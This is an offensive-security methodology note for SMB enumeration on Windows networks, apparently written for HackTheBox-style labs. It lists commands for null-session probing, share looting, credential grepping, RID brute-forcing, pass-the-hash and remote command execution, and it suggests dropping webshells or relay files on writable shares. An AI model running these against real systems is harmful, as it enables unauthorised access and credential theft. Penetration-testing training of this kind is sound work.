# SMB Enumeration

> The single richest enumeration surface on Windows / mixed networks.
> Anonymous-then-authenticated probing, share inventory, file mining.

## Objective
Map every SMB share, every reachable user, every file you can read,
every group structure you can pull — without authentication first, then
with whatever creds you have.

## When To Use
Whenever port 139 or 445 is open. Always.

## Detection Indicators
- `nmap -p139,445 -sV` returns `Microsoft Windows ... Samba`.
- `smb-os-discovery` script reveals OS and netbios name.
- AD-context hint: `nmap --script smb2-security-mode <ip>`.

## Enumeration Strategy

### Layer 1 — anonymous

```bash
# fastest survey
smbmap -H <ip>

# explicit null and guest
smbmap -H <ip> -u '' -p ''
smbmap -H <ip> -u guest -p ''

# share listing (does not require successful session for IPC$)
smbclient -L //<ip>/ -N
smbclient -L //<ip>/ -U 'guest'%''

# null-session connect
smbclient //<ip>/IPC$ -N

# enum4linux-ng — one-shot wrapper
enum4linux-ng -A <ip>

# crackmapexec sweep + share list (with --shares)
crackmapexec smb <ip>
crackmapexec smb <ip> -u '' -p '' --shares
crackmapexec smb <ip> -u guest -p '' --shares
```

### Layer 2 — authenticated (any cred)

```bash
crackmapexec smb <ip> -u <user> -p '<pass>' --shares
crackmapexec smb <ip> -u <user> -p '<pass>' --pass-pol
crackmapexec smb <ip> -u <user> -p '<pass>' --rid-brute        # discover all users
crackmapexec smb <ip> -u <user> -p '<pass>' --loggedon-users
crackmapexec smb <ip> -u <user> -p '<pass>' --sessions

# Mount and recursively dump readable shares
mkdir mnt; sudo mount -t cifs //<ip>/<share> mnt -o user=<u>,password='<p>',vers=2.0
```

### Layer 3 — file mining inside readable shares

```bash
smbclient //<ip>/<share> -U <u>%'<p>' -c 'recurse ON; prompt OFF; mget *'

# back on attacker:
grep -RinE "(pass|pwd|secret|key|cpassword|connection)\s*[:=]" .
strings *.exe *.dll *.bin 2>/dev/null | grep -iE "password|cpassword"
```

## Exploitation Workflow

1. Anonymous `smbmap -H` → record every share + permission.
2. For each readable share, recurse-download.
3. Grep for credentials, KDBX, configuration files.
4. Specific high-value findings:
   - `Groups.xml` (GPP cpassword) — see `active-directory/gpp-cpassword.md`.
   - `Unattend.xml` / `sysprep.xml` (deployment creds).
   - `web.config` / `connectionStrings`.
   - `*.kdbx` (KeePass) → cracking pipeline.
   - `*.bak`, `*.old`, `*.config`, `*.sql`.
5. With creds, repeat as authenticated user.
6. With creds, RID-brute → full user list.
7. With creds, look for hidden shares (admin$, c$).

## Commands

```bash
# Connect and download
smbclient //<ip>/<share> -U '<u>'%'<p>'
> recurse ON
> prompt OFF
> mget *

# Single file by path
smbclient //<ip>/<share> -U '<u>'%'<p>' -c 'get path/to/file local-name'

# RID brute (works with any cred, even null on some boxes)
crackmapexec smb <ip> -u '' -p '' --rid-brute 10000

# Pass-the-hash via SMB
crackmapexec smb <range> -u administrator -H <NTLM> --local-auth

# Execute via SMB
crackmapexec smb <ip> -u <u> -p '<p>' -x 'whoami /priv'
crackmapexec smb <ip> -u <u> -p '<p>' --exec-method smbexec -x 'whoami'
```

## Tool Usage

- `smbmap` — quickest "what shares and what perms" view.
- `smbclient` — interactive browser; analogous to FTP client.
- `enum4linux` / `enum4linux-ng` — wrapper that runs many checks at once.
- `crackmapexec` — *the* swiss-army; spray, enumerate, execute.
- `impacket-smbclient.py` — Pythonic alternative; supports hashes.
- `impacket-lookupsid.py` — SID brute even from null session.
- `rpcclient -U "" -N <ip>` — DCERPC null session enumeration.

## Common Mistakes

| Mistake | Symptom | Fix |
|---|---|---|
| Skipping anonymous before brute | "STATUS_LOGON_FAILURE" loops | Always try null/guest first |
| Forgetting `--local-auth` for local admin | Sprays appear to fail | Add the flag |
| Using SMBv1 forced when target is v2/3 | `vers=1.0` mount fails | `vers=3.0` or omit |
| Trusting share list shown to anon | Hidden shares (admin$, c$) require name | Try connecting by name (`smbclient //<ip>/ADMIN$ -N`) |
| Not recursively mining | Miss creds 3 dirs deep | `recurse ON; mget *` |

## Decision-Making Logic

```
smbmap -H <ip> →
  ├─ shares listed, all NO ACCESS
  │    └─ try guest, then null on IPC$
  │    └─ if AD: enum users via rpcclient null
  │    └─ try kerbrute for username discovery
  │
  ├─ shares listed, READ on Replication / SYSVOL
  │    └─ download → look for Groups.xml (GPP)
  │
  ├─ shares listed, READ on Audit / Backup / Dev / Users
  │    └─ download → mine config / kdbx / bak
  │
  └─ shares listed, WRITE somewhere
       └─ drop a webshell? (if shared with web docroot)
       └─ drop SCF/.lnk file (NTLM relay)
       └─ stage tools for execution
```

## Pivot Opportunities
SMB credentials enable:
- WinRM (`evil-winrm`).
- `psexec` / `wmiexec` / `smbexec` for command execution.
- LDAP authenticated queries.
- BloodHound collection.
- DCSync if rights are sufficient.

## OPSEC Considerations
- `psexec` writes a service to the target → loud event log entries.
- `smbexec` uses semi-interactive command exec; quieter but slower.
- `wmiexec` quietest of the three command-exec methods.
- RID brute is loud and easily fingerprinted.
- SMB null sessions are commonly logged but rarely alarmed.

## Real HTB Examples

- **Active** — anon `Replication` share → `Groups.xml` → cpassword.
- **Cascade** — `r.thompson` cred → SMB shares → `CascAudit.exe`.
- **Forest** — RPC null → `enumdomusers` → AS-REPRoast.
- **Sauna** — SMB locked down; pivot to website-driven username harvest.
- **Bastion** — readable backups share with VHD file → mount → SAM dump.
- **Querier** — `Reports` share with macro-laden `.xlsm` → cred extraction.

## Alternative Techniques

- `nmap --script smb-enum-shares,smb-enum-users` — quick survey.
- `responder` for NTLM hash capture (poisoning, if you're on the LAN).
- `impacket-smbserver` to host a fake share for relay / file delivery.

## Automation Opportunities

A single command captures most of what you need:
```bash
crackmapexec smb <ip> -u '<u>' -p '<p>' --shares --pass-pol --users --groups --loggedon-users --sessions --rid-brute 5000
```

## Checklist

- [ ] Anonymous probe: smbmap, smbclient -L, rpcclient null
- [ ] enum4linux-ng -A
- [ ] CME --shares with null and guest
- [ ] CME --rid-brute
- [ ] Recursively download every readable share
- [ ] Grep all downloaded files for creds
- [ ] Repeat with creds when discovered

## Related Skills

- [`smb/anonymous-share-enumeration.md`](../smb/anonymous-share-enumeration.md)
- [`smb/authenticated-share-mining.md`](../smb/authenticated-share-mining.md)
- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`tool-usage/crackmapexec.md`](../tool-usage/crackmapexec.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`methodology/02-enumeration-first.md`](../methodology/02-enumeration-first.md)
